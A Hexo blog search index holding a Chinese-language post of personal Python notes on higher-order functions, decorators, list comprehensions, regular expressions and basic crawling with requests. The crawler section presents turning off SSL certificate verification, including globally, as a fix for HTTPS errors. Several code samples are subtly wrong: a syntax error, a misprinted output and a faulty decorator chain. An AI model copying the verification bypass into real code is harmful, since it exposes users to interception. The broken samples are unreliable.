<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[python拯救计划]]></title>
      <url>/2019/12/18/python-saving/</url>
      <content type="html"><![CDATA[<p>我决心要提高python编程能力. 在此积累一些牛逼的python使用方法.</p>
<a id="more"></a>


<h1 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h1><h2 id="func-args-kw"><a href="#func-args-kw" class="headerlink" title="func(*args, **kw)"></a><code>func(*args, **kw)</code></h2><p>可以接收任何数量的或者有关键字的参数的函数的一般形式.<br>这个可能不算是”高阶函数”, 但是我先把它放在这里吧</p>
<h2 id="filter"><a href="#filter" class="headerlink" title="filter()"></a>filter()</h2><p>filter这个单词的意思是过滤器, 顾名思义, filter()可以起到过滤器的作用.</p>
<blockquote>
<p>filter(function, sequence)<br>Parameters:<br>function: function that tests if each element of a<br>sequence true or not.<br>sequence: sequence which needs to be filtered, it can<br>be sets, lists, tuples, or containers of any iterators.<br>Returns:<br>returns an iterator that is already filtered.</p>
</blockquote>
<p>实例1:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># function that filters vowels </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(variable)</span>:</span> </span><br><span class="line">    letters = [<span class="string">'a'</span>, <span class="string">'e'</span>, <span class="string">'i'</span>, <span class="string">'o'</span>, <span class="string">'u'</span>] </span><br><span class="line">    <span class="keyword">if</span> (variable <span class="keyword">in</span> letters): </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># sequence </span></span><br><span class="line">sequence = [<span class="string">'g'</span>, <span class="string">'e'</span>, <span class="string">'e'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'s'</span>, <span class="string">'p'</span>, <span class="string">'r'</span>] </span><br><span class="line">  </span><br><span class="line"><span class="comment"># using filter function </span></span><br><span class="line">filtered = filter(fun, sequence) </span><br><span class="line">  </span><br><span class="line">print(<span class="string">'The filtered letters are:'</span>) </span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> filtered: </span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure>

<p>output:</p>
<blockquote>
<p>The filtered letters are:<br>e<br>e</p>
</blockquote>
<p>实例2: </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a list contains both even and odd numbers.  </span></span><br><span class="line">seq = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># result contains odd numbers of the list </span></span><br><span class="line">result = filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span>, seq) </span><br><span class="line">print(list(result)) </span><br><span class="line">  </span><br><span class="line"><span class="comment"># result contains even numbers of the list </span></span><br><span class="line">result = filter(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">0</span>, seq) </span><br><span class="line">print(list(result))</span><br></pre></td></tr></table></figure>

<p>output: </p>
<blockquote>
<p>[1, 3, 5, 13]<br>[0, 2, 8]</p>
</blockquote>
<p>filter的第一个参数为一个 <strong>lambda表达式</strong>. </p>
<h2 id="map"><a href="#map" class="headerlink" title="map()"></a>map()</h2><p>个人理解: 通过某种函数规则, 利用传入的(一个或多个)序列生成输出的序列.</p>
<blockquote>
<p>map(fun, iter)<br>Parameters :<br>fun : It is a function to which map passes each element of given iterable.<br>iter : It is a iterable which is to be mapped.<br>NOTE : You can pass one or more iterable to the map() function.<br>Returns :<br>Returns a list of the results after applying the given function<br>to each item of a given iterable (list, tuple etc.)</p>
</blockquote>
<p>实例1: </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addition</span><span class="params">(n)</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> n + n </span><br><span class="line">  </span><br><span class="line"><span class="comment"># We double all numbers using map() </span></span><br><span class="line">numbers = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>) </span><br><span class="line">result = map(addition, numbers) </span><br><span class="line">print(list(result))</span><br></pre></td></tr></table></figure>

<p>output:</p>
<blockquote>
<p>{2, 4, 6, 8}</p>
</blockquote>
<p>实例2:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">numbers1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] </span><br><span class="line">numbers2 = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>] </span><br><span class="line">  </span><br><span class="line">result = map(<span class="keyword">lambda</span> x, y: x + y, numbers1, numbers2) </span><br><span class="line">print(list(result))</span><br></pre></td></tr></table></figure>

<p>output :</p>
<blockquote>
<p>[5, 7, 9]</p>
</blockquote>
<h2 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate()"></a>enumerate()</h2><p>个人理解: 可以返回可迭代的对象的”键值对”(枚举类对象)</p>
<blockquote>
<p>Syntax:<br>enumerate(iterable, start=0)<br>Parameters:<br>Iterable: any object that supports iteration<br>Start: the index value from which the counter is<br>              to be started, by default it is 0 </p>
</blockquote>
<p>举例:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L2 = [<span class="string">'hello'</span>, <span class="string">'world'</span>, <span class="number">18</span>, <span class="string">'apple'</span>, <span class="literal">None</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[(x,y) <span class="keyword">for</span> x,y <span class="keyword">in</span> list(enumerate(L2))]</span><br><span class="line">[(<span class="number">0</span>, <span class="string">'hello'</span>), (<span class="number">1</span>, <span class="string">'world'</span>), (<span class="number">2</span>, <span class="number">18</span>), (<span class="number">3</span>, <span class="string">'apple'</span>), (<span class="number">4</span>, <span class="literal">None</span>)]</span><br></pre></td></tr></table></figure>

<h1 id="lambda表达式"><a href="#lambda表达式" class="headerlink" title="lambda表达式"></a>lambda表达式</h1><p>个人理解: lambda表达式 是一种匿名的函数.</p>
<p>Syntax:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arguments : expression</span><br></pre></td></tr></table></figure>

<p>lambda表达式等效于函数, 例如下面的代码:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">lambda</span> a : a + <span class="number">10</span></span><br><span class="line"><span class="comment"># 等效于</span></span><br><span class="line"><span class="comment"># def x(a):</span></span><br><span class="line"><span class="comment">#     return a+10</span></span><br><span class="line">print(x(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>output</p>
<blockquote>
<p>15</p>
</blockquote>
<p>定义有多个参数的lambda表达式:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">lambda</span> a, b, c : a + b + c</span><br><span class="line">print(x(<span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>output:</p>
<blockquote>
<p>13</p>
</blockquote>
<h1 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h1><p>个人理解: 如果事前已经定义好一个函数f(), 随后想扩展它的功能而又不想修改 f() 的代码, 就可以使用装饰器.</p>
<p>例如, 已经有定义好的函数:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure>

<h2 id="简单装饰器"><a href="#简单装饰器" class="headerlink" title="简单装饰器"></a>简单装饰器</h2><p>现在, 想扩展f()的功能, 使其在输出<code>&quot;hello world&quot;</code>前先打印<code>&quot;start&quot;</code>. </p>
<p>为了不修改原来的代码, 可定义装饰器函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></span><br><span class="line">        print(<span class="string">'start'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure>

<p>再在f()的定义前使用 @ 语法指定这个装饰器</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@before</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'hello world'</span>)</span><br></pre></td></tr></table></figure>

<p>此时调用f(), 输出为:</p>
<blockquote>
<p>start<br>hello world</p>
</blockquote>
<p>实际上, 装饰器是一个返回函数的高阶函数.<br>当调用 f() 时, 因为存在装饰器, 所以并不会直接运行 f() 函数体内的代码, 而是会调用函数 before(f).<br>所以调用 f() 等效于:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = before(f)</span><br><span class="line">f()</span><br></pre></td></tr></table></figure>

<p>而 before 中其实只有一行代码 <code>return wrapper</code>.<br>所以 f 指向了新的函数 <code>wrapper</code>.<br>所以 <code>f()</code> 等效于 <code>wrapper()</code>.</p>
<h2 id="在-f-运行后再打印-quot-finish-quot"><a href="#在-f-运行后再打印-quot-finish-quot" class="headerlink" title="在 f() 运行后再打印&quot;finish&quot;"></a>在 f() 运行后再打印<code>&quot;finish&quot;</code></h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></span><br><span class="line">        print(<span class="string">'start'</span>)</span><br><span class="line">        result = func(*args, **kw)</span><br><span class="line">        print(<span class="string">'finish)</span></span><br><span class="line"><span class="string">        return result</span></span><br><span class="line"><span class="string">    return wrapper</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@before</span></span><br><span class="line"><span class="string">def f(*args, **kw):</span></span><br><span class="line"><span class="string">    print('</span>hello world<span class="string">')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f()</span></span><br></pre></td></tr></table></figure>

<p>在 wrapper 中用变量 result 保存了 func 的返回值, 并在适当时刻返回到函数外.</p>
<h2 id="使用多个装饰器实现上一个功能"><a href="#使用多个装饰器实现上一个功能" class="headerlink" title="使用多个装饰器实现上一个功能"></a>使用多个装饰器实现上一个功能</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></span><br><span class="line">        print(<span class="string">'start'</span>)</span><br><span class="line">        <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></span><br><span class="line">        result = func()()</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@after</span></span><br><span class="line"><span class="meta">@before</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(*args, **kw)</span>:</span></span><br><span class="line">    print(<span class="string">'hello world'</span>)</span><br><span class="line"></span><br><span class="line">f()</span><br></pre></td></tr></table></figure>

<p>多个装饰器的执行顺序为由内到外.<br>等效于:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = after(before(f))</span><br><span class="line">f()</span><br></pre></td></tr></table></figure>

<h2 id="使用带有参数的装饰器-打印-quot-start-quot-参数"><a href="#使用带有参数的装饰器-打印-quot-start-quot-参数" class="headerlink" title="使用带有参数的装饰器, 打印&quot;start&quot; + 参数"></a>使用带有参数的装饰器, 打印<code>&quot;start&quot; + 参数</code></h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">with_parm</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">before</span><span class="params">(func)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></span><br><span class="line">            print(<span class="string">'start'</span>, name)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> before</span><br><span class="line"></span><br><span class="line"><span class="meta">@with_parm('yjn')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(*args, **kw)</span>:</span></span><br><span class="line">    print(<span class="string">'hello world'</span>)</span><br><span class="line"></span><br><span class="line">f()</span><br></pre></td></tr></table></figure>

<p>这里带有参数的装饰器, 本质上是对原有的装饰器的封装.<br><code>with_parm(&#39;yjn&#39;)</code> 返回的便是普通的装饰器(before).<br>只不过在 with_parm 内通过传入的参数对 before 进行修改.</p>
<h1 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h1><p>假如需要一个列表: [1,4,9,16 …., 100], 可以使用哪些语法?</p>
<ol>
<li><p>使用for循环</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    a.append(x**<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用文章开始提到的 map() 函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(map(<span class="keyword">lambda</span> x:x**<span class="number">2</span>,list(range(<span class="number">1</span>,<span class="number">10</span>))))</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<strong>列表生成式</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>)]</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>可以看出列表生成式能极大的简化代码. </p>
<p>此外如果使用两层for, 可以生成全排列.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[m+n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">"abc"</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">"yjn"</span>]</span><br><span class="line">[<span class="string">'ay'</span>, <span class="string">'aj'</span>, <span class="string">'an'</span>, <span class="string">'by'</span>, <span class="string">'bj'</span>, <span class="string">'bn'</span>, <span class="string">'cy'</span>, <span class="string">'cj'</span>, <span class="string">'cn'</span>]</span><br></pre></td></tr></table></figure>

<p>还可以搭配 if 和 else 一起使用:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L1 = [<span class="string">'Hello'</span>, <span class="string">'World'</span>, <span class="number">18</span>, <span class="string">'Apple'</span>, <span class="literal">None</span>] </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x.lower()  <span class="keyword">if</span> isinstance(x,str) <span class="keyword">else</span> x <span class="keyword">for</span> x <span class="keyword">in</span> L1]       </span><br><span class="line">[<span class="string">'hello'</span>, <span class="string">'world'</span>, <span class="number">18</span>, <span class="string">'apple'</span>, <span class="literal">None</span>]</span><br></pre></td></tr></table></figure>

<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><table>
<thead>
<tr>
<th>符号</th>
<th>解释</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>匹配任意字符</td>
<td>b.t</td>
<td>可以匹配bat / but / b#t / b1t等</td>
</tr>
<tr>
<td>\w</td>
<td>匹配字母/数字/下划线</td>
<td>b\wt</td>
<td>可以匹配bat / b1t / b_t等<br>但不能匹配b#t</td>
</tr>
<tr>
<td>\s</td>
<td>匹配空白字符（包括\r、\n、\t等）</td>
<td>love\syou</td>
<td>可以匹配love you</td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字</td>
<td>\d\d</td>
<td>可以匹配01 / 23 / 99等</td>
</tr>
<tr>
<td>\b</td>
<td>匹配单词的边界</td>
<td>\bThe\b</td>
<td></td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串的开始</td>
<td>^The</td>
<td>可以匹配The开头的字符串</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串的结束</td>
<td>.exe$</td>
<td>可以匹配.exe结尾的字符串</td>
</tr>
<tr>
<td>\W</td>
<td>匹配非字母/数字/下划线</td>
<td>b\Wt</td>
<td>可以匹配b#t / b@t等<br>但不能匹配but / b1t / b_t等</td>
</tr>
<tr>
<td>\S</td>
<td>匹配非空白字符</td>
<td>love\Syou</td>
<td>可以匹配love#you等<br>但不能匹配love you</td>
</tr>
<tr>
<td>\D</td>
<td>匹配非数字</td>
<td>\d\D</td>
<td>可以匹配9a / 3# / 0F等</td>
</tr>
<tr>
<td>\B</td>
<td>匹配非单词边界</td>
<td>\Bio\B</td>
<td></td>
</tr>
<tr>
<td>[]</td>
<td>匹配来自字符集的任意单一字符</td>
<td>[aeiou]</td>
<td>可以匹配任一元音字母字符</td>
</tr>
<tr>
<td>[^]</td>
<td>匹配不在字符集中的任意单一字符</td>
<td>[^aeiou]</td>
<td>可以匹配任一非元音字母字符</td>
</tr>
<tr>
<td>*</td>
<td>匹配0次或多次</td>
<td>\w*</td>
<td></td>
</tr>
<tr>
<td>+</td>
<td>匹配1次或多次</td>
<td>\w+</td>
<td></td>
</tr>
<tr>
<td>?</td>
<td>匹配0次或1次</td>
<td>\w?</td>
<td></td>
</tr>
<tr>
<td>{N}</td>
<td>匹配N次</td>
<td>\w{3}</td>
<td></td>
</tr>
<tr>
<td>{M,}</td>
<td>匹配至少M次</td>
<td>\w{3,}</td>
<td></td>
</tr>
<tr>
<td>{M,N}</td>
<td>匹配至少M次至多N次</td>
<td>\w{3,6}</td>
<td></td>
</tr>
<tr>
<td>|</td>
<td>分支</td>
<td>foo|bar</td>
<td>可以匹配foo或者bar</td>
</tr>
<tr>
<td>(?#)</td>
<td>注释</td>
<td></td>
<td></td>
</tr>
<tr>
<td>(exp)</td>
<td>匹配exp并捕获到自动命名的组中</td>
<td></td>
<td></td>
</tr>
<tr>
<td>(?&nbsp;&lt;name&gt;exp)</td>
<td>匹配exp并捕获到名为name的组中</td>
<td></td>
<td></td>
</tr>
<tr>
<td>(?:exp)</td>
<td>匹配exp但是不捕获匹配的文本</td>
<td></td>
<td></td>
</tr>
<tr>
<td>(?=exp)</td>
<td>匹配exp前面的位置</td>
<td>\b\w+(?=ing)</td>
<td>可以匹配I’m dancing中的danc</td>
</tr>
<tr>
<td>(?&lt;=exp)</td>
<td>匹配exp后面的位置</td>
<td>(?&lt;=\bdanc)\w+\b</td>
<td>可以匹配I love dancing and reading中的第一个ing</td>
</tr>
<tr>
<td>(?!exp)</td>
<td>匹配后面不是exp的位置</td>
<td></td>
<td></td>
</tr>
<tr>
<td>(?&lt;!exp)</td>
<td>匹配前面不是exp的位置</td>
<td></td>
<td></td>
</tr>
<tr>
<td>*?</td>
<td>重复任意次，但尽可能少重复</td>
<td>a.*b<br>a.*?b</td>
<td>将正则表达式应用于aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串</td>
</tr>
<tr>
<td>+?</td>
<td>重复1次或多次，但尽可能少重复</td>
<td></td>
<td></td>
</tr>
<tr>
<td>??</td>
<td>重复0次或1次，但尽可能少重复</td>
<td></td>
<td></td>
</tr>
<tr>
<td>{M,N}?</td>
<td>重复M到N次，但尽可能少重复</td>
<td></td>
<td></td>
</tr>
<tr>
<td>{M,}?</td>
<td>重复M次以上，但尽可能少重复</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>Python提供了re模块来支持正则表达式相关操作，下面是re模块中的核心函数。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>compile(pattern, flags=0)</td>
<td>编译正则表达式返回正则表达式对象</td>
</tr>
<tr>
<td>match(pattern, string, flags=0)</td>
<td>用正则表达式匹配字符串 成功返回匹配对象 否则返回None</td>
</tr>
<tr>
<td>search(pattern, string, flags=0)</td>
<td>搜索字符串中第一次出现正则表达式的模式 成功返回匹配对象 否则返回None</td>
</tr>
<tr>
<td>split(pattern, string, maxsplit=0, flags=0)</td>
<td>用正则表达式指定的模式分隔符拆分字符串 返回列表</td>
</tr>
<tr>
<td>sub(pattern, repl, string, count=0, flags=0)</td>
<td>用指定的字符串替换原字符串中与正则表达式匹配的模式 可以用count指定替换的次数</td>
</tr>
<tr>
<td>fullmatch(pattern, string, flags=0)</td>
<td>match函数的完全匹配（从字符串开头到结尾）版本</td>
</tr>
<tr>
<td>findall(pattern, string, flags=0)</td>
<td>查找字符串所有与正则表达式匹配的模式 返回字符串的列表</td>
</tr>
<tr>
<td>finditer(pattern, string, flags=0)</td>
<td>查找字符串所有与正则表达式匹配的模式 返回一个迭代器</td>
</tr>
<tr>
<td>purge()</td>
<td>清除隐式编译的正则表达式的缓存</td>
</tr>
<tr>
<td>re.I / re.IGNORECASE</td>
<td>忽略大小写匹配标记</td>
</tr>
<tr>
<td>re.M / re.MULTILINE</td>
<td>多行匹配标记</td>
</tr>
</tbody></table>
<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>基本爬虫工作流程:</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/crawler-workflow.jpg" alt title class>
                <p></p>
            </figure>

<p>常用标准库和第三方库:</p>
<ul>
<li>下载数据 - urllib / requests / aiohttp。</li>
<li>解析数据 - re / lxml / beautifulsoup4 / pyquery。</li>
<li>缓存和持久化 - pymysql / sqlalchemy / peewee/ redis / pymongo。</li>
<li>生成数字签名 - hashlib。</li>
<li>序列化和压缩 - pickle / json / zlib。</li>
<li>调度器 - 多进程（multiprocessing） / 多线程（threading）。</li>
</ul>
<p>当访问https链接时会因为验证SSL证书而产生错误. 解决方法有下面两种:</p>
<ul>
<li><p>使用未经验证的上下文</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url=<span class="string">'...'</span>, headers=&#123;...&#125;) </span><br><span class="line">context = ssl._create_unverified_context()</span><br><span class="line">web_page = urllib.request.urlopen(request, context=context)</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置全局性取消证书验证</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">ssl._create_default_https_context = ssl._create_unverified_context</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="request-库"><a href="#request-库" class="headerlink" title="request 库"></a>request 库</h2><ol>
<li>使用GET请求和POST请求<ul>
<li>简单请求页面方式:</li>
</ul>
</li>
</ol>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">'https://api.github.com/events'</span>)</span><br><span class="line">r = requests.post(<span class="string">'http://httpbin.org/post'</span>, data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line">r = requests.delete(<span class="string">'http://httpbin.org/delete'</span>)</span><br><span class="line">r = requests.head(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line">r = requests.options(<span class="string">'http://httpbin.org/get'</span>)</span><br></pre></td></tr></table></figure>

<p>得到一个名为 r 的 Response 对象.</p>
<ol start="2">
<li><p>参数和请求头</p>
<ul>
<li>带有参数的请求:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">"http://httpbin.org/get"</span>, params=payload)</span><br><span class="line">r = requests.post(<span class="string">'http://httpbin.org/post'</span>, data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line">r = requests.put(<span class="string">'http://httpbin.org/put'</span>, data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)</span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: [<span class="string">'value2'</span>, <span class="string">'value3'</span>]&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://httpbin.org/get'</span>, params=payload)</span><br><span class="line">print(r.url)</span><br><span class="line"><span class="comment"># http://httpbin.org/get?key1=value1&amp;key2=value2&amp;key2=value3</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ol>
<pre><code>+ 发送 Cookie
